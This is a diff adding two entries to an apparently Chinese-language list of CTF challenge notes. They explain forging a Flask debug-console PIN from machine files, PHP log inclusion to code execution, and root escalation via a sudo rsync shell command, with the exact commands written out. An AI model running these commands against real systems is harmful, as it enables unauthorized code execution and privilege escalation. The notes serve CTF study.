@@ -1924,3 +1924,38 @@ if __name__ == "__main__":
 216. [YouWatch](https://mizu.re/post/youwatch)
 - `<span dangerouslySetInnerHTML={{ __html: `${msg}` }}></span>`允许以html的形式直接插入msg的内容。就算过滤十分严格可能无法直接xss，也可以考虑dom clobbering。
 - NextJS DOM Clobbering。似乎是作者自己发现的一个漏洞，详细内容在wp里，尚且不确定是否仅适用于这道题
+217. [Drink from my Flask #2](https://github.com/HeroCTF/HeroCTF_v5/tree/main/System/Drink_from_my_Flask_2)
+- flaskdev debug console pin码伪造。flaskdev pin码的生成函数与普通flask的生成函数有点不同，多了一个变量。这些变量分别是：
+```
+probably_public_bits = [
+    'flaskdev',# username
+    'flask.app',# modname
+    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/usr/local/lib/python3.8/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private bits:
+
+mac address的十进制
+cat /sys/class/net/eth0/address
+python3 -c "print(int('mac'.replace(':',''), 16))"
+或者
+python3 -c "import uuid;print(str(uuid.getnode()))"
+
+/etc/machine-id拼接/proc/self/cgroup
+
+cat /etc/machine-id
+49bab8e92cca463691a8b330fc54cc89
+cat /proc/self/cgroup
+0::/
+
+如果是上面这种情况的话（第二个文件的斜杠后没有内容），这一栏对应的private element是49bab8e92cca463691a8b330fc54cc89
+
+flaskdev addition。此位为开发者设置，无固定要求
+```
+脚本在wp里
+
+218. [A woman's weapon](https://v0lk3n.github.io/writeup/HeroCTFv5/HeroCTFv5-SystemCollection#lfm2)
+- php 日志文件（log）包含导致LFI->RCE。
+- 利用/usr/bin/rsync提权。https://gtfobins.github.io/gtfobins/rsync/ 。首先使用`sudo -l`查看`/usr/bin/rsync`是否具有suid。若有，则可利用该命令将当前用户提权到suid的用户。`sudo -u <suid-user> /usr/bin/rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`
+- 利用python命令生成交互shell.`python3 -c 'import pty; pty.spawn("/bin/bash")'`
